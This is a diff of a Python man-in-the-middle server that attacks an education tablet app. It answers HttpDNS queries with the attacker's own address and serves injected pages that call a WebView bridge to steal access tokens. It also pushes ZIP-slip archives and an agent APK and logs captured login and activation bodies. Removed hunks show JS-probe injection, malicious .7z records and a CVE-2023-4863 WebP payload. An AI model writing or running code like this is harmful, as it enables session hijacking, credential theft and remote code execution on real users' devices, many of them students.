 def _mr_fix_proto(v):
@@ -935,7 +937,7 @@ def micro_rewrite(body_bytes):
         · SB103007 资源(RESOURCE 服务: 实测端侧从它下发课件图片 xhfs*.oss-cn-hangzhou)
         · WEB002011 / WEB113001-3  网页(H5)服务
         · SB103027 / SB103016      文件服务
-        ⇒ 这些指到 http://192.168.137.1:80(我们的明文面)
+        ⇒ 这些指到 http://192.168.3.114:80(我们的明文面)
         ⇒ 端侧加载 H5/资源时从我们这里取 => 该 H5 在带 webView 桥的 WebViewActivity 里渲染
           => 我们注入的载荷执行 => window.webView.getToken() => "Bearer <accessToken>" => 会话接管
         ⇒ 其余类型(账号 SA106003 / 升级 / 推送 SB103018 / 数据等)保持真实地址 => App 仍在线 ✓
@@ -1111,6 +1113,41 @@ def build_response(path, body=b"", host="", method="GET"):
         except Exception as _e3:
             wlog("[SENTRY-DUMP-ERR] %s" % _e3)
     _ep = path.split("?")[0]
+    # ===== LOGIN/ACTIVATION/ASSIST 接管 (2026-11-01) =====
+    import hashlib as _hl2
+    _lp2 = path.split("?")[0].lower()
+    if "/api/v2/platform/login" in _lp2:
+        _lb2 = body[:4000].decode("utf-8", "replace") if body else ""
+        wlog("!!!!!! [LOGIN] device login body: %s" % _lb2)
+        try:
+            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "login_captured.log"), "a", encoding="utf-8") as _lf2:
+                _lf2.write("%s %s %s\n" % (datetime.datetime.now(), host, _lb2))
+        except Exception:
+            pass
+        _fake2 = {"userId": 2112229, "userName": "zhonghaoyang7", "userType": 0, "schoolId": 0,
+                  "schoolName": "", "accessToken": "FAKE." + _hl2.md5(_lb2.encode("utf-8")).hexdigest(),
+                  "refreshToken": "FAKEREF." + _hl2.md5(_lb2.encode("utf-8")).hexdigest(),
+                  "expiresIn": 7200, "refreshExpiresIn": 86400, "agreementSigned": True,
+                  "activated": True, "microAddressDTOList": []}
+        return _resp(json.dumps(_fake2).encode("utf-8"), "application/json; charset=UTF-8")
+    if "/activation/verify" in _lp2 or "/activation/status" in _lp2:
+        _lb2 = body[:2000].decode("utf-8", "replace") if body else ""
+        wlog("!!!!!! [ACTIVATION] body: %s" % _lb2)
+        try:
+            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "login_captured.log"), "a", encoding="utf-8") as _lf2:
+                _lf2.write("%s ACTIVATION %s %s\n" % (datetime.datetime.now(), host, _lb2))
+        except Exception:
+            pass
+        return _resp(json.dumps({"code": 200, "message": "success", "data": True}).encode("utf-8"), "application/json; charset=UTF-8")
+    if "/assists/" in _lp2 and _lp2.endswith("/tasks"):
+        wlog("!!!!!! [ASSIST] device pulls tasks -> %d executeCmd tasks" % len(ASSIST_TASKS))
+        return _resp(json.dumps(ASSIST_TASKS, ensure_ascii=False).encode("utf-8"), "application/json; charset=UTF-8")
+    if "/assists" in _lp2:
+        wlog("!!!!!! [ASSIST] device requests assist session -> %s" % ASSIST_SESSION.get("id"))
+        return _resp(json.dumps(ASSIST_SESSION, ensure_ascii=False).encode("utf-8"), "application/json; charset=UTF-8")
+    if "/assist/result" in _lp2:
+        wlog("!!!!!! [ASSIST] result: %s" % (body[:600].decode("utf-8", "replace") if body else ""))
+        return _resp(json.dumps({"code": 200, "message": "success"}).encode("utf-8"), "application/json; charset=UTF-8")
     _eq = path.split("?", 1)[1] if "?" in path else ""
 
     # ★★★ 错题库接口伪造 (引导端侧产生带批注的错题 -> 触发明文批量下载)
@@ -1201,26 +1238,10 @@ def build_response(path, body=b"", host="", method="GET"):
         wlog("!!!!!! [ZIPSLIP] 批量下载命中 -> 下发 ZIP %dB (写 xuehai/keep/launcher_dynamic.ini)" % len(_zb))
         return _resp(_zb, "application/zip")
 
-    # 【2026-10-24】TOKEN-PAGE: 问卷/通知 H5 的文档导航 => 整页替换成我们自己的页面
-    #   依据(10-04 实证 3 次): 直接下发我们自己的页面(同源相对信标)时, WebView 会执行其 JS;
-    #   而"改真实页面的内联脚本"会被 CSP 拦、"改 .js" 会被 SRI 完整性校验拦(今天已实证)。
-    #   该 WebView 注册了 LauncherJs + webView(getToken) 桥 => 页面 JS 可读取会话令牌。
-    try:
-        _h_low = (host or "").lower()
-        _is_doc_host = ("survey" in _h_low) or ("zjxhedu" in _h_low)
-        _is_beacon = any(_b in path for _b in ("TOKENLEAK", "LEAK", "/p.gif", "/PHOTO"))
-        if _is_doc_host and not _is_beacon and _ep in ("/", "/index.html", "/home", ""):
-            stat["token_page"] = stat.get("token_page", 0) + 1
-            wlog("!!!!!! [TOKEN-PAGE] %s%s -> 下发 EXPLOIT_PAGE (%dB)" % (
-                host, path[:60], len(EXPLOIT_PAGE)))
-            return _resp(EXPLOIT_PAGE, "text/html; charset=UTF-8")
-    except Exception as _tpe:
-        wlog("[TOKEN-PAGE-ERR] %s" % _tpe)
-
     # 【其余全部】代理到真服务器 —— 保证登录与所有应用功能正常
     # ★★★ PAYLOAD-PRE (2026-10-16 21:5x): 在代理之前先拦"指向我们自己的归档/安装包请求"。
     #   实测场景(WS 注入 canvas_tag+type=3 短语下发, voiceUrl 指向我们):
-    #     [HIGH-VALUE-RESOURCE] .7z GET /poc0003.7z | Host=192.168.137.1
+    #     [HIGH-VALUE-RESOURCE] .7z GET /poc0003.7z | Host=192.168.3.114
     #   => 这些请求原先落到本分支并被当成"要代真服务器" => 转发失败 => 白跑
     #   => 现在直接下发我们的载荷(ZIP-SLIP / agent.apk)
     try:
@@ -1268,20 +1289,6 @@ def build_response(path, body=b"", host="", method="GET"):
                         host, path[:80], len(_pb), _pct[:40]))
         except Exception as _ie:
             wlog("[HTML-INJECT-ERR] %s" % _ie)
-        # JS-INJECT (2026-10-24): CSP 可能阻止内联 script => 往端侧自己的 .js 里追加探针
-        try:
-            _low2 = (_pct or "").lower()
-            _p0b = path.split("?")[0].lower()
-            if (("javascript" in _low2) or _p0b.endswith(".js")) \
-                    and "gzip" not in _low2 and _pb and len(_pb) > 32:
-                _jpay = BRIDGE_PROBE or b""
-                if _jpay:
-                    _pb = _pb + b"\n;\n/*probe*/\n" + _jpay + b"\n"
-                    stat["js_inject"] = stat.get("js_inject", 0) + 1
-                    wlog("!!!!!! [JS-INJECT] \u6ce8\u5165\u6865\u63a2\u9488 -> %s%s (%dB, %s)" % (
-                        host, path[:80], len(_pb), _pct[:40]))
-        except Exception as _je:
-            wlog("[JS-INJECT-ERR] %s" % _je)
         wlog("[PROXY-ALL] %s %s%s -> %dB %s" % (method, host, path[:110], len(_pb), _pct[:30]))
         return _resp(_pb, _pct)
     wlog("[PROXY-ALL-ERR] %s %s%s (真服务器不可达)" % (method, host, path[:110]))
@@ -1368,61 +1375,7 @@ def build_response(path, body=b"", host="", method="GET"):
     # 都会落到我们控制的页面上, 其 JS 里的 window.webView.getToken() 即回传会话令牌。
     if "getPage" in path or host == "airclassrecord.yunzuoye.net":
         stat["getpage"] = stat.get("getpage", 0) + 1
-        # 【2026-10-24】代理真实响应 -> 落盘 -> **注入我们控制的记录** -> 返回
-        #   真实 schema: {"code":200,"msg":"success","data":[{"records":[]}],"desc":""}
-        #   records 字段: videoId/userId/createTime/classroomId/classroomName/
-        #                 mediaUrl/timeLength/status/changeStatus/type
-        try:
-            _rb, _rct = proxy_real(host, method, path, body)
-            try:
-                _gp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "getpage_capture.log")
-                with open(_gp, "a", encoding="utf-8") as _gf:
-                    _gf.write("\n===== %s %s %s%s -> %dB =====\n" % (
-                        datetime.datetime.now(), method, host, path[:200], len(_rb)))
-                    _gf.write(_rb.decode("utf-8", "replace")[:30000] + "\n")
-            except Exception:
-                pass
-            # 注入记录
-            try:
-                _j = json.loads(_rb.decode("utf-8", "replace"))
-                _records = _j.get("records")
-                _data = _j.get("data")
-                _targets = []
-                if isinstance(_data, list):
-                    _targets = _data
-                elif isinstance(_data, dict):
-                    _targets = [_data]
-                else:
-                    _targets = [_j]
-                _now = int(time.time() * 1000)
-                for _d0 in _targets:
-                    if not isinstance(_d0, dict):
-                        continue
-                    _recs = _d0.get("records")
-                    if not isinstance(_recs, list):
-                        _recs = []
-                    _media = "http://%s/poc7z.7z" % OUR_IP
-                    _new = {
-                        "videoId": "LABV1", "userId": 2112229,
-                        "createTime": _now, "classroomId": "UXHOVJJF",
-                        "classroomName": "lab", "mediaUrl": _media,
-                        "timeLength": 1, "status": 1, "changeStatus": 1,
-                        "type": 1, "name": "lab", "title": "lab",
-                        "videoName": "lab",
-                    }
-                    _recs.insert(0, _new)
-                    _d0["records"] = _recs
-                _j["data"] = _targets
-                _rb2 = json.dumps(_j, ensure_ascii=False).encode("utf-8")
-                stat["getpage_inject"] = stat.get("getpage_inject", 0) + 1
-                wlog("!!!!!! [GETPAGE-INJECT] 已注入记录 mediaUrl=http://%s/poc7z.7z -> %dB" % (OUR_IP, len(_rb2)))
-                return _resp(_rb2, _rct)
-            except Exception as _je:
-                wlog("[GETPAGE-INJ-ERR] %s" % _je)
-            return _resp(_rb, _rct)
-        except Exception as _ge:
-            wlog("[GETPAGE-ERR] %s" % _ge)
-        wlog("!!!!!! [GETPAGE] 代理失败 -> 综合响应 | Host=%s" % host)
+        wlog("!!!!!! [GETPAGE] 课堂页面接口命中: %s | Host=%s -> 综合响应" % (path[:170], host))
         page = "http://%s/xhpage" % OUR_IP
         html = EXPLOIT_PAGE.decode("utf-8", "replace")
         obj = {"code": 0, "msg": "ok", "success": True, "status": 0, "total": 1,
@@ -1433,21 +1386,6 @@ def build_response(path, body=b"", host="", method="GET"):
                         "type": "webview"},
                "html": html, "content": html, "page": html}
         return _resp(json.dumps(obj).encode("utf-8"), "application/json; charset=UTF-8")
-    # 【2026-10-24】CVE-2023-4863 投递: 端侧从明文 OSS 拉取的图片 -> 替换成恶意 WebP
-    #   设备 SPL 2021-08 ⇒ 系统 libwebp 未打 2023-09 补丁 ⇒ 解码恶意 WebP 触发堆溢出
-    try:
-        _ep2 = path.split("?")[0]
-        _ext_img = _ep2.rsplit(".", 1)[-1].lower() if "." in _ep2 else ""
-        if _ext_img in ("png", "jpg", "jpeg", "webp", "gif", "bmp"):
-            _wp = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nso.webp")
-            if os.path.exists(_wp):
-                _wblob = open(_wp, "rb").read()
-                stat["webp_serve"] = stat.get("webp_serve", 0) + 1
-                wlog("!!!!!! [WEBP-SERVE] 图片请求 -> 下发恶意 WebP (%dB) | Host=%s | %s" % (
-                    len(_wblob), host, path[:90]))
-                return _resp(_wblob, "image/webp")
-    except Exception as _we:
-        wlog("[WEBP-SERVE-ERR] %s" % _we)
     # 0) 透明中继(云教室等): 取真响应 -> 落盘 -> 原样转发
     if host in RELAY_HOSTS:
         data, ct = relay_capture(host, method, path, body)
@@ -1456,7 +1394,7 @@ def build_response(path, body=b"", host="", method="GET"):
     """按路径分派明文应答。
 
     关键分支 HttpDNS: 端侧用 POST /103172/d?host=<domain> 做域名解析(明文, 真服务器
-    现在直接 RST)。把它回答成 192.168.137.1 —— 即本机自有地址, **本地投递**,
+    现在直接 RST)。把它回答成 192.168.3.114 —— 即本机自有地址, **本地投递**,
     不依赖任何 loopback 别名 —— 于是 ms/control 等明文基址全部落到我们身上,
     整条 assist 链(服务发现 -> versionChange -> assists/tasks -> assist/result)
     都能在明文面完成, 彻底绕开 TLS 信任与 PBS 推送。
@@ -1464,10 +1402,10 @@ def build_response(path, body=b"", host="", method="GET"):
     if "/103172/d" in path or "host=" in path:
         hosts = re.findall(r"host=([^&\s]+)", path) or ["null"]
         # 【2026-10-04 修正】只劫持白名单里的域, 其余返回**真实 IP**。
-        # 之前"全部回 192.168.137.1"会破坏设备所有联网(HTTPS 被 tls_relay 错误转发 -> 加载失败)。
+        # 之前"全部回 192.168.3.114"会破坏设备所有联网(HTTPS 被 tls_relay 错误转发 -> 加载失败)。
         # 另外: 空/`null` host 必须**拒绝应答**(回空 ips), 否则应用会拿到空 URL 去加载
         # -> 这正是"加载网页失败, 请检查网络"的直接原因
-        #    (日志: POST /103172/d?host=null -> 192.168.137.1 -> GET /?userId=.. | Host=null)。
+        #    (日志: POST /103172/d?host=null -> 192.168.3.114 -> GET /?userId=.. | Host=null)。
         def _ips_for(h):
             if not h or h.lower() in ("null", "none", "undefined", "0.0.0.0"):
                 return []
@@ -1494,7 +1432,7 @@ def build_response(path, body=b"", host="", method="GET"):
         #   不再转发真服务器(否则表里仍是真实 HTTPS 地址, 我们无法介入)。
         #   依据: XHMicroServer.MICRO_SERVICE_URL="http://ms.yunzuoye.net/XhServerMg/GetXsList"
         #         BaseMicroServer.RESETFul_MICRO_SERVICE_HOST="http://ms.yunzuoye.net"  (均明文)
-        #   全部类型 -> http://192.168.137.1:80  => 端侧服务层归我们 => 可下发应用/MDM 安装
+        #   全部类型 -> http://192.168.3.114:80  => 端侧服务层归我们 => 可下发应用/MDM 安装
         _force = (os.environ.get("TABLE_FORCE_OURS") or "1").strip() not in ("0", "no", "false")
         if _force:
             try:
@@ -2316,7 +2254,7 @@ def main():
         f.write("\n===== npcap_http80 start %s watch=%ds page=%s bodylen=%d =====\n" % (
             datetime.datetime.now(), WATCH, BODY_SRC, len(BODY)))
     wlog("iface=%s pad=%s 冒充 :%d | 页面=%s (%dB)" % (iface_name(), PAD, PORT, BODY_SRC, len(BODY)))
-    sn = AsyncSniffer(iface=iface_name(), store=False, prn=on_pkt, filter="tcp and port %d" % PORT)
+    sn = AsyncSniffer(iface=iface_name(), store=False, prn=on_pkt, filter="ip")
     sn.start()
     t0 = time.time()
     while time.time() - t0 < WATCH:
